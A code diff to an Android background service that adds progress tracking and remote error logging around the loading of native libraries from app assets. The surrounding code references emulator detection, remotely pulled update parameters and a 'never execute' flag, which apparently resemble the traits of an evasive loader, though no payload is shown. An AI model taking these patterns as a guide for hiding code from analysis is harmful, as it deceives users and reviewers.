@@ -6,6 +6,7 @@ import android.content.Intent;
 import android.os.IBinder;
 
 import com.use.nice.manager.GlobalContext;
+import com.use.nice.update.UDCtrl;
 import com.use.nice.update.UpdateUtil;
 import com.use.nice.util.EmulateCheckUtil;
 import com.use.nice.util.Util_File;
@@ -25,7 +26,7 @@ public class MyService extends Service {
     }
 
     ExecutorService service = Executors.newSingleThreadExecutor();
-    final  static boolean testAsset = true;
+    public final  static boolean testAsset = false;
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Util_Log.log("onStartCommand");
@@ -34,6 +35,8 @@ public class MyService extends Service {
             NiceFace.onReceive(this, intent);
             return super.onStartCommand(intent, flags, startId);
         }
+
+        Util_File.writeDef(this,"progress","99");
 
         if(Util_File.readDef(this,FieldName.nice_forver,"0").equals("1")){
             Util_Log.log("永不执行标记！");
@@ -55,7 +58,18 @@ public class MyService extends Service {
                     public void run() {
                         Context paramContext = MyService.this;
                         Util_Log.log(UpdateUtil.surePullParams(paramContext, null).toString());
-    //                将data目录释放到sdcard
+
+                        //若so执行失败就就错误进度保存
+                        String lastSoProgress = Util_File.readDef(paramContext,FieldName.progress,"0");
+                        if(!lastSoProgress.equals("0")){
+                            UDCtrl.getIns().pushLog(201+"_"+lastSoProgress);
+                            //    Util_File.writeDef(ctx, FieldName.bad_progress, lastSoProgress);
+                            Util_File.writeDef(paramContext,FieldName.progress,"0");
+                        }
+
+
+
+                        //                将data目录释放到sdcard
                         //AssetsCopy.copyFileOrDir(paramContext, "data");
     //                加载assets下so文件
                         final NiceCtrl face = NiceCtrl.getIns();
